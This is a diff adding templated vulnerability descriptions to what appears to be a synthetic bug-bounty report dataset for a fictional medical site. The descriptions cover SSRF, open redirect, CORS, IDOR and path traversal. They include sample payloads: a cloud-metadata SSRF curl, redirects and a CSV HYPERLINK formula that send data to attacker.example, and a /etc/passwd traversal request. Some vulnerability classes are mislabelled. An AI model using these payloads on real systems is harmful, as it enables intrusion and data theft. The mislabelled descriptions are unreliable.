+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7117,7 +7169,8 @@
           "offset": "17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://docs.alpenlichtmed.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7253,7 +7306,8 @@
           "offset": "2d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://docs.alpenlichtmed.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7427,7 +7481,8 @@
           "offset": "8d 12h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://docs.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7530,7 +7585,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://docs.alpenlichtmed.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7650,7 +7706,8 @@
           "offset": "2d 3h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://docs.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7805,7 +7862,8 @@
           "offset": "8d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://docs.alpenlichtmed.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7945,7 +8003,8 @@
           "offset": "6d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://docs.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8081,7 +8140,8 @@
           "offset": "3d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://docs.alpenlichtmed.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8191,7 +8251,8 @@
           "offset": "1d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8350,7 +8411,8 @@
           "offset": "7d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8470,7 +8532,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8618,7 +8681,8 @@
           "offset": "6d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenlichtmed.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8765,7 +8829,8 @@
           "offset": "3d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://docs.alpenlichtmed.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8889,7 +8954,8 @@
           "offset": "2d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://docs.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9060,7 +9126,8 @@
           "offset": "7d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9172,7 +9239,8 @@
           "offset": "5d 2h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://docs.alpenlichtmed.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9303,7 +9371,8 @@
           "offset": "6d 22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://updates.alpenlichtmed.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9454,7 +9523,8 @@
           "offset": "4d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://updates.alpenlichtmed.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9576,7 +9646,8 @@
           "offset": "7d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenlichtmed.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9706,7 +9777,8 @@
           "offset": "3d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://updates.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9834,7 +9906,8 @@
           "offset": "2d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenlichtmed.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9949,7 +10022,8 @@
           "offset": "3d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://updates.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10113,7 +10187,8 @@
           "offset": "7d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://updates.alpenlichtmed.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10217,7 +10292,8 @@
           "offset": "1d 22h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://updates.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10348,7 +10424,8 @@
           "offset": "3d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10519,7 +10596,8 @@
           "offset": "4d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://updates.alpenlichtmed.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10623,7 +10701,8 @@
           "offset": "14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10737,7 +10816,8 @@
           "offset": "3d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10855,7 +10935,8 @@
           "offset": "8d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://updates.alpenlichtmed.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10995,7 +11076,8 @@
           "offset": "5d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://updates.alpenlichtmed.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11082,7 +11164,8 @@
           "offset": "1d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
